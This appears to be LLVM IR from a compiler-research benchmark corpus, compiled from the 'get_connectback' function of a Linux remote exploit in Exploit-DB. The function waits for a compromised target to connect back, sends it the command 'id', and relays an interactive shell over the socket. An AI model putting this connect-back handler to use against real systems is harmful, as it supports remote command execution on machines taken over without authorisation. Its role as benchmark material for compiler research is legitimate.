; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23772.c_get_connectback.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23772.c_get_connectback.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [12 x i8] c"** listen()\00", align 1
@SIGALRM = common dso_local global i32 0, align 4
@signal_handler = common dso_local global i32 0, align 4
@SIGUSR1 = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [27 x i8] c"[*] Awaiting connect back\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [21 x i8] c"** Connection error\0A\00", align 1
@.str.3 = private unnamed_addr constant [28 x i8] c"[*] Target connected back\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"id\0A\00", align 1
@FD_SETSIZE = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [38 x i8] c"** SASH Error: FD_SETSIZE to small!\0D\0A\00", align 1
@STDIN_FILENO = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8
@EINTR = common dso_local global i64 0, align 8
@.str.6 = private unnamed_addr constant [9 x i8] c"select()\00", align 1
@STDOUT_FILENO = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [7 x i8] c"read()\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"write()\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @get_connectback(i32 %0, i32 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [8192 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %4, align 4
  store i32 %1, i32* %5, align 4
  store i32 4, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = call i64 @listen(i32 %14, i32 1)
  %16 = icmp slt i64 %15, 0
  br i1 %16, label %17, label %19

17:                                               ; preds = %2
  %18 = call i32 @perror(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %122

19:                                               ; preds = %2
  %20 = load i32, i32* @SIGALRM, align 4
  %21 = load i32, i32* @signal_handler, align 4
  %22 = call i32 @signal(i32 %20, i32 %21)
  %23 = call i32 @alarm(i32 5)
  %24 = load i32, i32* %4, align 4
  %25 = load i32, i32* @SIGUSR1, align 4
  %26 = call i32 @kill(i32 %24, i32 %25)
  %27 = load i32, i32* %4, align 4
  %28 = call i32 @waitpid(i32 %27, i32* null, i32 0)
  %29 = call i32 @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0))
  %30 = load i32, i32* %5, align 4
  %31 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %32 = call i32 @accept(i32 %30, %struct.sockaddr* %31, i32* %7)
  store i32 %32, i32* %9, align 4
  %33 = icmp slt i32 %32, 0
  br i1 %33, label %34, label %37

34:                                               ; preds = %19
  %35 = load i32, i32* @stderr, align 4
  %36 = call i32 @fprintf(i32 %35, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %122

37:                                               ; preds = %19
  %38 = call i32 @alarm(i32 0)
  %39 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.3, i64 0, i64 0))
  %40 = call i32 @wait(i32* null)
  %41 = load i32, i32* %9, align 4
  %42 = call i32 @write(i32 %41, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0), i32 3)
  %43 = load i32, i32* %9, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %12, align 4
  %45 = load i32, i32* @FD_SETSIZE, align 4
  %46 = icmp sgt i32 %44, %45
  br i1 %46, label %47, label %50

47:                                               ; preds = %37
  %48 = load i32, i32* @stderr, align 4
  %49 = call i32 @fprintf(i32 %48, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.5, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %122

50:                                               ; preds = %37
  %51 = call i32 @FD_ZERO(i32* %10)
  %52 = load i32, i32* %9, align 4
  %53 = call i32 @FD_SET(i32 %52, i32* %10)
  %54 = load i32, i32* @STDIN_FILENO, align 4
  %55 = call i32 @FD_SET(i32 %54, i32* %10)
  br label %56

56:                                               ; preds = %120, %67, %50
  %57 = call i32 @memcpy(i32* %13, i32* %10, i32 4)
  %58 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %59 = call i32 @memset(i8* %58, i32 0, i32 8192)
  %60 = load i32, i32* %12, align 4
  %61 = call i64 @select(i32 %60, i32* %13, i32* null, i32* null, i32* null)
  %62 = icmp slt i64 %61, 0
  br i1 %62, label %63, label %70

63:                                               ; preds = %56
  %64 = load i64, i64* @errno, align 8
  %65 = load i64, i64* @EINTR, align 8
  %66 = icmp eq i64 %64, %65
  br i1 %66, label %67, label %68

67:                                               ; preds = %63
  br label %56

68:                                               ; preds = %63
  %69 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %122

70:                                               ; preds = %56
  %71 = load i32, i32* @STDIN_FILENO, align 4
  %72 = call i64 @FD_ISSET(i32 %71, i32* %13)
  %73 = icmp ne i64 %72, 0
  br i1 %73, label %74, label %95

74:                                               ; preds = %70
  %75 = load i32, i32* @STDOUT_FILENO, align 4
  %76 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %77 = call i32 @read(i32 %75, i8* %76, i32 8192)
  store i32 %77, i32* %11, align 4
  %78 = icmp slt i32 %77, 0
  br i1 %78, label %79, label %81

79:                                               ; preds = %74
  %80 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0))
  br label %121

81:                                               ; preds = %74
  %82 = load i32, i32* %11, align 4
  %83 = icmp eq i32 %82, 0
  br i1 %83, label %84, label %85

84:                                               ; preds = %81
  br label %121

85:                                               ; preds = %81
  %86 = load i32, i32* %9, align 4
  %87 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %88 = load i32, i32* %11, align 4
  %89 = call i32 @write(i32 %86, i8* %87, i32 %88)
  %90 = load i32, i32* %11, align 4
  %91 = icmp ne i32 %89, %90
  br i1 %91, label %92, label %94

92:                                               ; preds = %85
  %93 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %122

94:                                               ; preds = %85
  br label %95

95:                                               ; preds = %94, %70
  %96 = load i32, i32* %9, align 4
  %97 = call i64 @FD_ISSET(i32 %96, i32* %13)
  %98 = icmp ne i64 %97, 0
  br i1 %98, label %99, label %120

99:                                               ; preds = %95
  %100 = load i32, i32* %9, align 4
  %101 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %102 = call i32 @read(i32 %100, i8* %101, i32 8192)
  store i32 %102, i32* %11, align 4
  %103 = icmp slt i32 %102, 0
  br i1 %103, label %104, label %106

104:                                              ; preds = %99
  %105 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0))
  br label %121

106:                                              ; preds = %99
  %107 = load i32, i32* %11, align 4
  %108 = icmp eq i32 %107, 0
  br i1 %108, label %109, label %110

109:                                              ; preds = %106
  br label %121

110:                                              ; preds = %106
  %111 = load i32, i32* @STDOUT_FILENO, align 4
  %112 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %113 = load i32, i32* %11, align 4
  %114 = call i32 @write(i32 %111, i8* %112, i32 %113)
  %115 = load i32, i32* %11, align 4
  %116 = icmp ne i32 %114, %115
  br i1 %116, label %117, label %119

117:                                              ; preds = %110
  %118 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %122

119:                                              ; preds = %110
  br label %120

120:                                              ; preds = %119, %95
  br label %56

121:                                              ; preds = %109, %104, %84, %79
  store i32 0, i32* %3, align 4
  br label %122

122:                                              ; preds = %121, %117, %92, %68, %47, %34, %17
  %123 = load i32, i32* %3, align 4
  ret i32 %123
}

declare dso_local i64 @listen(i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @alarm(i32) #1

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i32 @waitpid(i32, i32*, i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @wait(i32*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @memcpy(i32*, i32*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
